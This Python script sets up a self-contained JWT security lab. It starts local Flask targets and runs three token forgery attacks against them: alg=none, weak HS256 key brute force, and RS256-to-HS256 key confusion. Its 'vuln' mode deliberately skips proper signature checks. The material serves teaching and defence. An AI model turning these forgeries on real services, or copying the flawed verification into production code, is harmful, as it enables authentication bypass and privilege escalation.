#!/usr/bin/env python3
"""11 · JWT 安全实验室：三种攻击 vs 三个靶

用法:
    python3 jwt_lab.py keygen artifacts/                 # 生成 strong 靶的 RSA 密钥对
    python3 jwt_lab.py serve vuln|weak|strong            # 起嵌入式 flask 靶
    python3 jwt_lab.py attack none   <base_url>          # none 算法伪造
    python3 jwt_lab.py attack brute  <base_url> -w 字典  # HS256 弱密钥字典爆破（离线验签）
    python3 jwt_lab.py attack confuse <base_url>         # RS256→HS256 算法混淆

仅攻击本实验自建靶站。JWT 是「签名声明」——签名错了就不该信，本实验演示
实现薄弱的三种翻车方式。
"""
import argparse
import base64
import hashlib
import hmac
import json
import sys
import time
import warnings
from pathlib import Path

warnings.filterwarnings("ignore", message="The HMAC key is")   # 弱密钥爆破演示会持续触发

import jwt as pyjwt
import requests
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa

CONF = Path(__file__).parent / "configs" / "lab_profiles.json"


def conf():
    return json.loads(CONF.read_text(encoding="utf-8"))


def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


# ============================================================ serve
def cmd_keygen(args):
    out = Path(args.out)
    out.mkdir(parents=True, exist_ok=True)
    key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    (out / "jwt-rsa-private.pem").write_bytes(key.private_bytes(
        serialization.Encoding.PEM, serialization.PrivateFormat.PKCS8,
        serialization.NoEncryption()))
    (out / "jwt-rsa-public.pem").write_bytes(key.public_key().public_bytes(
        serialization.Encoding.PEM, serialization.PublicFormat.SubjectPublicKeyInfo))
    print(f"[=] RSA 密钥对已生成：{out}/jwt-rsa-private.pem 与 jwt-rsa-public.pem")
    return 0


def cmd_serve(args):
    from flask import Flask, jsonify, request as req

    c = conf()
    mode = args.mode
    prof = c["profiles"][mode]
    app = Flask(__name__)

    def issue_token(username):
        payload = {"sub": username, "role": "user", "iat": int(time.time())}
        if mode == "strong":
            priv = Path(args.keys) / "jwt-rsa-private.pem"
            return pyjwt.encode(payload, priv.read_bytes(), algorithm="RS256")
        return pyjwt.encode(payload, prof["secret"], algorithm="HS256")

    def decode_token(token):
        if mode == "vuln":                     # ❌ 漏洞模式：按 token 自称的算法验签
            alg = pyjwt.get_unverified_header(token).get("alg", "")
            if alg == "none":
                # 现实的漏洞写法：手写解析、把「签名段为空」当成合法（等价于跳过验签）
                _, body, _ = token.split(".")
                body = body + "=" * (-len(body) % 4)
                return json.loads(base64.urlsafe_b64decode(body))
            return pyjwt.decode(token, prof["secret"], algorithms=[alg])
        if mode == "weak":
            return pyjwt.decode(token, prof["secret"], algorithms=["HS256"])
        pub = (Path(args.keys) / "jwt-rsa-public.pem").read_bytes()
        return pyjwt.decode(token, pub, algorithms=["RS256"])

    @app.post("/login")
    def login():
        body = req.get_json(silent=True) or {}
        if body.get("username") == c["user"]["username"] and \
                body.get("password") == c["user"]["password"]:
            return jsonify({"token": issue_token(body["username"])})
        return jsonify({"error": "bad credentials"}), 401

    @app.get("/public-key")
    def public_key():
        return (Path(args.keys) / "jwt-rsa-public.pem").read_text(), 200,
        {"Content-Type": "text/plain"}

    @app.get("/admin")
    def admin():
        auth = req.headers.get("Authorization", "")
        if not auth.startswith("Bearer "):
            return jsonify({"error": "missing token"}), 401
        try:
            payload = decode_token(auth[7:])
        except pyjwt.InvalidTokenError as e:
            return jsonify({"error": f"invalid token: {type(e).__name__}"}), 401
        if payload.get("role") != "admin":
            return jsonify({"error": "not admin", "role": payload.get("role")}), 403
        return jsonify({"flag": c["flag"], "hello": payload.get("sub")})

    print(f"[*] {mode} 靶已启动：http://127.0.0.1:{args.port}（{prof['note']}）",
          flush=True)
    app.run(host="127.0.0.1", port=args.port, debug=False)
    return 0


# ============================================================ attacks
def forge_none(sub="alice", role="admin"):
    header = b64url(json.dumps({"alg": "none", "typ": "JWT"}).encode())
    payload = b64url(json.dumps({"sub": sub, "role": role}).encode())
    return f"{header}.{payload}."               # 签名段留空


def cmd_attack(args):
    if args.kind == "none":
        token = forge_none()
        r = requests.get(f"{args.url}/admin",
                         headers={"Authorization": f"Bearer {token}"}, timeout=5)
        print(f"[none] 伪造 alg=none 的 admin token → HTTP {r.status_code}：{r.text}")
        return 0 if r.status_code == 200 else 1

    if args.kind == "brute":
        words = [w.strip() for w in Path(args.wordlist).read_text(
            encoding="utf-8").splitlines() if w.strip()]
        r = requests.post(f"{args.url}/login", json={"username": "alice",
                                                     "password": "wonderland"}, timeout=5)
        token = r.json()["token"]
        t0 = time.perf_counter()
        for guess in words:
            try:
                pyjwt.decode(token, guess, algorithms=["HS256"])   # 离线验签，快
            except pyjwt.InvalidTokenError:
                continue
            dt = time.perf_counter() - t0
            print(f"[brute] 命中：密钥 = {guess}（候选 {len(words)} 条，耗时 {dt:.2f}s）")
            return 0
        dt = time.perf_counter() - t0
        print(f"[brute] 字典 {len(words)} 条跑完未命中（耗时 {dt:.2f}s）")
        return 1

    if args.kind == "confuse":
        pub = requests.get(f"{args.url}/public-key", timeout=5).text
        # 把公钥 PEM 原文当 HMAC 密钥，手工构造 HS256 的 admin token
        header = b64url(json.dumps({"alg": "HS256", "typ": "JWT"}).encode())
        body = b64url(json.dumps({"sub": "alice", "role": "admin"}).encode())
        sig = b64url(hmac.new(pub.encode(), f"{header}.{body}".encode(),
                              hashlib.sha256).digest())
        token = f"{header}.{body}.{sig}"
        r = requests.get(f"{args.url}/admin",
                         headers={"Authorization": f"Bearer {token}"}, timeout=5)
        print(f"[confuse] HS256 公钥伪造 → HTTP {r.status_code}：{r.text}")
        return 0 if r.status_code == 200 else 1
    raise SystemExit("未知攻击类型")


def main():
    parser = argparse.ArgumentParser(description="JWT 安全实验室（仅本机靶站）")
    sub = parser.add_subparsers(dest="cmd", required=True)

    p1 = sub.add_parser("keygen")
    p1.add_argument("out")
    p1.set_defaults(func=cmd_keygen)

    p2 = sub.add_parser("serve")
    p2.add_argument("mode", choices=["vuln", "weak", "strong"])
    p2.add_argument("--port", type=int, required=True)
    p2.add_argument("--keys", default="artifacts")
    p2.set_defaults(func=cmd_serve)

    p3 = sub.add_parser("attack")
    p3.add_argument("kind", choices=["none", "brute", "confuse"])
    p3.add_argument("url")
    p3.add_argument("-w", "--wordlist", default="configs/wordlist.txt")
    p3.set_defaults(func=cmd_attack)

    args = parser.parse_args()
    return args.func(args)


if __name__ == "__main__":
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        print("\n[!] 已中断", file=sys.stderr)
        sys.exit(130)
